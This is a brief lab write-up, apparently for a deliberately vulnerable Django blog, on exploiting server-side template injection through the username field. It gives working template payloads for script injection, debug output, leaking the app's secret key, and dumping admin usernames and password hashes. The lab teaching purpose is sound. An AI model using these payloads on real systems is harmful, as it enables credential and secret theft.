# Server Side Template Injection

Observe the [Setting Page](https://blog-vul.herokuapp.com/setting/), you can see that username is a dynamic content and displayed __Hi, Username__.

![Web page display username](https://user-images.githubusercontent.com/83699106/132437761-05b5e2dc-98e0-4c50-8cb2-7e9e0c9c33b1.png)

## Solution

Register an account.You will be realized that it don't control the username format and this web use Django framwork. So you can register an account with an special username.


### B1. Identify the underlying engine.

Python has some template engine such as Tornaldo, Jinja, Django, ... . Now , sign up an account with username is a formula evaluation. 

`{{ 7 * 7 }}`

But it doesn't work. 
![image](https://user-images.githubusercontent.com/83699106/132441238-1b673cff-9fd0-4fd6-b0c1-d11cb83bec05.png)


Maybe it use Django template because DJT do not allow formula evaluation by default. Trying another payload.

`{% debug %}`

![image](https://user-images.githubusercontent.com/83699106/132442170-d95e57e5-9147-4592-bc53-ef614f8ca80d.png)


__Successfully__, It displayed debug content in username. 

### B2. Exploit

After indentify the template engine that it's using is DJT. We can exploit futher. The impact of this attack in DJT is not serious than other template languages and these are some payload you can use to exploit.

__Cross-site scripting__
```
{{ '<script>alert(3)</script>' }}
{{ '<script>alert(3)</script>' | safe }}

```

__Debug information leak__
```

{% debug %}

```

__Leaking app’s Secret Key__
```
{{ messages.storages.0.signer.key }}

```
__Admin username and password hash leak__
```
{% load log %}{% get_admin_log 10 as log %}{% for e in log %}
{{e.user.get_username}} : {{e.user.password}}{% endfor %}

```

To clear understand about SSTI attack and Ways to exploit Django template above. You can see [here](https://lifars.com/wp-content/uploads/2021/06/Django-Templates-Server-Side-Template-Injection-v1.0.pdf)
           
        
